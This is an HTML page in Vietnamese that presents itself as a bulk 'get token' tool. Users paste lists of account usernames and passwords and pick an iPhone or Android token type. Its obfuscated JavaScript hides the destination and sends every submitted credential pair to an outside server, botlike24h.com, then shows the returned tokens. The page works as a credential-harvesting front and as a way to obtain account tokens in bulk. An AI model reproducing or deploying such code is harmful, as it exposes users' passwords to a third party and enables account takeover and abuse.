<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="//code.jquery.com/jquery.min.js"></script>
<title>
GET TOKEN FULL QUYỀN SLL</title> 
<link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
<link href="//cdn.shopify.com/s/files/1/0691/5403/t/123/assets/style.scss.css?13701263572696252361" rel="stylesheet" type="text/css"  media="all"  />
</head>
<body id="dashboard" class="background-dark template-product" >
 <div class="container">
    <div class="row text-centered">
      <div class="col-md-12 text-center">
<div class="panel panel-default">
<div class="panel-heading">
<h3 class="panel-title">AUTO GETTOKEN HÀNG LOẠT</h3>
</div>
<div class="panel-body">
<div class="form-group">
<label for="acc">* LIST ACC CẦN GETTOKEN :</label>
<textarea cols="80" id="listacc" name="acc" rows="50" style="height:200px;width:600" placeholder="account1|password1
account2|password2"></textarea></div>
<div class="form-group"><label for="loai">* CHỌN LOẠI TOKEN :</label>
<select id="loai" class="form-control">
<option value="1">IPHONE</option>
<option value="2">ANDROID</option>
</select>
</div>
<div class="form-group"><label for="time">* Time :</label>
<input id="time" disabled="disabled" value="1" class="form-control"/>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-primary">Bắt Đầu</button>
</div>
<div class="col-md-12">
<div class="panel panel-primary">
<div class="panel-title">
</div>
<pre id="noti"> Kết Quả Trả Về Sẽ Hiển Thị Ở Đây</pre>
<div class="panel-body" id="load_result" style="display:none">
<label for="result">Kết Quả của bạn là :</label>
<textarea id="result" rows="10" onclick="this.focus();this.select()" class="form-control"></textarea>
</div>
</div>
</div>
</div>
</div>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Loaing...", "html", "val", "#listacc", "#loai", "#time option:selected", "removeAttr", "Bắt Đầu", "show", "#load_result", "Bạn Đã Nhập Thiếu Dự Kiện Or Token Die", "#result", "fail", "https://botlike24h.com/gettoken/test.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                listacc: _0x1ea6x1,
                loai: _0x1ea6x2,
                time: _0x1ea6x3

            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]),$(_0x6619[1])[_0x6619[5]](_0x6619[11]),$(_0x6619[13])[_0x6619[12]](),$(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
    
</script>

</div>
</div>
</div>
</body>
</html>
<?